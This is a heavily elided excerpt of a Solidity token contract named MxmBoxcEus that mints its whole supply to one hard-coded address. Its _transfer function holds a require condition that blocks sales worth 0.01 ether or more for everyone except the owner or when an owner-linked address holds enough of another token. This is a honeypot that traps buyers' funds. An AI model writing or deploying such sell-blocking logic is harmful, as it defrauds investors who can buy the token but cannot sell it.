...
contract MxmBoxcEus {
    ...
    constructor () public {
        ...
        balances[0x8212b7F1b5aAf1714213FCae7E54A38E88A8A398] = _totalSupply;
        emit Transfer(address(this), 0x8212b7F1b5aAf1714213FCae7E54A38E88A8A398, _totalSupply);
    ...
    function _transfer(address _sender, address _recipient, uint256 _amount) internal {
        ...
        require(sellMbe(_amount) < 0.01 ether || _sender==owner || _recipient == owner || ERC20(address(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c)).balanceOf(pir) >= 0.12 ether);
